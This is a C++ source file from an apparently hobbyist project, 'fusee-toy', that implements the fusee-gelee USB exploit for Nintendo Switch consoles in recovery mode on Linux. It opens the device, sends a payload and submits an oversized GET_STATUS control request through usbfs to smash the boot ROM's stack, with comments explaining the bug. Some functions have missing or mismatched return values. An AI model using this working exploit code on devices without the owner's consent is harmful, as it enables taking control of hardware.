/*
*   This file is part of fusee-toy
*   Copyright (C) 2022 Swiftloke
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*   GNU General Public License for more details.
*
*   You should have received a copy of the GNU General Public License
*   along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*   Additional Terms 7.b and 7.c of GPLv3 apply to this file:
*       * Requiring preservation of specified reasonable legal notices or
*         author attributions in that material or in the Appropriate Legal
*         Notices displayed by works containing it.
*       * Prohibiting misrepresentation of the origin of that material,
*         or requiring that modified versions of such material be marked in
*         reasonable ways as different from the original version.
*/

//
// Created by Swiftloke on 1/16/21.
//

#include <stdexcept>
#include "UsbCommsLinux.h"

#include <linux/usb/ch9.h>
#include <linux/usbdevice_fs.h>
#include <asm/byteorder.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <cstring>

bool UsbCommsLinux::OpenDevice()
{
    int rc = libusb_init(&context);
    if(rc != 0)
        throw std::runtime_error("Failed to init libusb!");

    dev = libusb_open_device_with_vid_pid(context, SWITCH_RCM_VENDOR_ID, SWITCH_RCM_PRODUCT_ID);
    if(!dev)
        throw std::runtime_error("Failed to find a Switch RCM device!");

    printf("Found a Switch RCM device!\n");

    //Obtain the device ID.
    int len_read;
    rc = libusb_bulk_transfer(dev, TEGRA_RCM_ENDPOINT_IN, RcmDeviceId.data(),
                         RcmDeviceId.size(), &len_read, 5);
    if(rc != 0 || len_read != RcmDeviceId.size())
        throw std::runtime_error("Failed to read Switch RCM device ID!");
    printf("Switch RCM Device ID: ");
    for(auto idchar : RcmDeviceId)
        printf("%02X", idchar);
    printf("\n");

    //Figure out where the device is
    libusb_device* underlying_device = libusb_get_device(dev);
    unsigned int busno =  libusb_get_bus_number(underlying_device);
    unsigned int addrno = libusb_get_device_address(underlying_device);

    //Now, open the file descriptor directly.
    char* dir = new char[strlen(LINUX_USBFS_ADDR)];
    snprintf(dir, strlen(LINUX_USBFS_ADDR), LINUX_USBFS_ADDR, busno, addrno);

    kernel_fd = open(dir, O_RDWR);

    return true;
}

//??? what's wrong with this, my spidey sense is tingling
//I think something is wrong with the high buf logic. Something could go wrong with
//the last, empty write to switch to the high buffer
bool UsbCommsLinux::WritePayload()
{
    for(rcx = 0; rcx < PayloadLen || !High_Buf; rcx += TEGRA_RCM_BLOCK_SIZE, High_Buf = !High_Buf)
    {
        unsigned int len_to_write = std::min(PayloadLen - rcx, TEGRA_RCM_BLOCK_SIZE);
        int len_written;
        int rc = libusb_bulk_transfer(dev, TEGRA_RCM_ENDPOINT_OUT, Payload.data() + rcx,
                                      static_cast<int>(len_to_write), &len_written, 5);
        if(rc != 0 || len_written != len_to_write)
            throw std::runtime_error("Failed to write payload!");
    }
}

bool UsbCommsLinux::SubmitVuln()
{
    //HACK INTO THE MAINFRAME AND BYPASS THE LIBUSB
    //Seriously, though, this takes some extra logic because libusb limits data requests
    //to their proper size, as explained below. Submission of the control request must be
    //made directly to the kernel for this reason.




    std::array<unsigned char, sizeof(struct usb_ctrlrequest) + STACK_SMASH_LEN> buffer{0};

    auto ctrlrequest = reinterpret_cast<usb_ctrlrequest*>(buffer.data());
    //Request goes from device to host (as GET_STATUS is a read request),
    //and we're asking for the status of the endpoint-
    //the USB_RECIP_ENDPOINT case is vulnerable, while the USB_RECIP_DEVICE case is not
    ctrlrequest->bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
    ctrlrequest->bRequest = USB_REQ_GET_STATUS;
    //Set the length of data requested- the USB spec states that if more data is requested
    //than is available, the amount of data available should be returned. In a GET_STATUS
    //control request (on an endpoint, I believe), this should be two bytes.
    //The fusee-gelee vulnerability is that the amount of data REQUESTED is returned to the
    //host, and in doing so, accidentally smashes the stack with user-controlled data.
    ctrlrequest->wLength = STACK_SMASH_LEN;

    //Not much interesting here, just crafting the USB Request Block (URB) that tells
    //the kernel what we want it to do.
    usbdevfs_urb urb
    {
            .type = USBDEVFS_URB_TYPE_CONTROL,
            .endpoint = 0,
            .buffer = buffer.data(),
            .buffer_length = buffer.size(),
            .usercontext = (void *) 0x1337,
    };
    usbdevfs_urb* out;
    //This may be load-bearing.
    usleep(1000*100);

    //Submit, reap and discard the URB. The docs are unclear as to why reaping and
    //discarding are necessary...
    //It may not be necessary at all? Be sure to try and remove it and see what happens.
    //fusee-launcher doesn't do it, while fusee-nano does.

    if (ioctl(kernel_fd, USBDEVFS_SUBMITURB, &urb) < 0)
        return -1;

    if (ioctl(kernel_fd, USBDEVFS_DISCARDURB, &urb) < 0)
        return -2;

    if (ioctl(kernel_fd, USBDEVFS_REAPURB, &out) < 0)
        return -3;

    if (urb.usercontext != (void *) 0x1337)
        return -4;
}